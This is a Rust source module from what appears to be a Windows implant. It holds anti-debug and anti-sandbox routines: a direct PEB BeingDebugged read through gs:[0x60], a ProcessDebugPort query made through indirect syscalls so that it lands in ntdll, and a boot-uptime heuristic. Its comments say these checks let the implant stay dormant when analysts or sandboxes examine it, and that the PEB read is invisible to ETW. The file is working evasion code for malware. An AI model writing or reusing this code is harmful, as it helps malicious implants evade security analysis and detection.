//! Anti-debug / anti-sandbox checks.
//!
//! Lightweight detection the implant can consult to decide whether to stay
//! dormant (sandboxes typically snapshot + analyze; a real user's interactive
//! session won't trip these). Two checks:
//!
//! - [`is_debugged`] — reads `PEB->BeingDebugged` directly via the gs-relative
//!   PEB pointer (no syscall, no export — the fastest, lowest-noise check). A
//!   ring-3 debugger sets this byte when attaching.
//! - [`is_remote_debugged`] — `NtQueryInformationProcess(ProcessDebugPort)`
//!   returns the debugger's port in the output; non-zero ⇒ debugged. This is
//!   a syscall via the indirect runtime so its RIP lands in ntdll.
//!
//! Plus a heuristic: [`uptime_secs`] via `GetTickCount64`, so a caller can
//! refuse to act inside the first N seconds of a likely-sandbox boot. These are
//! advisory — none abort the implant unilaterally; the caller decides.

#![cfg(target_os = "windows")]

use crate::resolve::export_addr;
use core::ffi::c_void;

/// `ProcessDebugPort` (ProcessInformationClass = 7). NtQueryInformationProcess
/// returns the remote debugger's port here; non-zero ⇒ a debugger is attached.
const PROCESS_DEBUG_PORT: u32 = 7;

/// Read `PEB->BeingDebugged` (the byte at PEB+2). The PEB is reached via the
/// x64 TEB (`gs:[0x60]`), no syscall or export involved — the cheapest possible
/// ring-3 debugger check and invisible to ETW.
pub fn is_debugged() -> bool {
    unsafe {
        let peb: *const u8;
        core::arch::asm!(
            "mov {p}, gs:[0x60]",
            p = out(reg) peb,
            options(nostack, preserves_flags, readonly),
        );
        // BeingDebugged is a BYTE at PEB + 0x02.
        *peb.add(2) != 0
    }
}

/// `NtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, &port, ...)`.
/// Returns true if a debugger port is set. Goes through the indirect-syscall
/// runtime when it's up (falls back to the resolved export otherwise).
pub fn is_remote_debugged() -> bool {
    type GetCurrentProcess = unsafe extern "system" fn() -> *mut c_void;
    type NtQueryInformationProcess = unsafe extern "system" fn(
        *mut c_void, // ProcessHandle
        u32,         // ProcessInformationClass
        *mut c_void, // ProcessInformation
        u32,         // ProcessInformationLength
        *mut u32,    // ReturnLength
    ) -> i32;

    // Prefer the indirect-syscall runtime if initialized.
    if let Some(rt) = crate::syscalls::global() {
        let mut port: usize = 0;
        let mut retlen: u32 = 0;
        // NtQueryInformationProcess is 5 args → syscall6 padded.
        let st = unsafe {
            crate::syscalls::syscall6(
                rt,
                crate::resolve::djb2(b"ntqueryinformationprocess"),
                usize::MAX, // GetCurrentProcess pseudohandle (-1 = 0xFFFF...FFFF).
                PROCESS_DEBUG_PORT as usize,
                &mut port as *mut usize as usize,
                core::mem::size_of::<usize>(),
                &mut retlen as *mut u32 as usize,
                0,
            )
        };
        if let Some(0) = st {
            return port != 0;
        }
        // Fall through to the export path if the syscall didn't return success.
    }

    // Export fallback.
    let gcp: GetCurrentProcess = match unsafe { export_addr(b"kernel32.dll", b"GetCurrentProcess") }
    {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return false,
    };
    let nqip: NtQueryInformationProcess =
        match unsafe { export_addr(b"ntdll.dll", b"NtQueryInformationProcess") } {
            Some(a) => unsafe { core::mem::transmute(a) },
            None => return false,
        };
    let mut port: usize = 0;
    let mut retlen: u32 = 0;
    let st = unsafe {
        nqip(
            gcp(),
            PROCESS_DEBUG_PORT,
            &mut port as *mut usize as *mut c_void,
            core::mem::size_of::<usize>() as u32,
            &mut retlen,
        )
    };
    st >= 0 && port != 0
}

/// `GetTickCount64` → milliseconds since boot, divided by 1000. A sandbox often
/// acts within seconds of boot; a real interactive session is usually minutes+
/// old. Advisory only — the caller picks the threshold.
pub fn uptime_secs() -> u64 {
    type GetTickCount64 = unsafe extern "system" fn() -> u64;
    let f: GetTickCount64 = match unsafe { export_addr(b"kernel32.dll", b"GetTickCount64") } {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return 0,
    };
    let ms = unsafe { f() };
    ms / 1000
}

/// Combined verdict: any single trip ⇒ treat the environment as hostile.
pub fn looks_sandboxed(min_uptime: u64) -> bool {
    is_debugged() || is_remote_debugged() || uptime_secs() < min_uptime
}
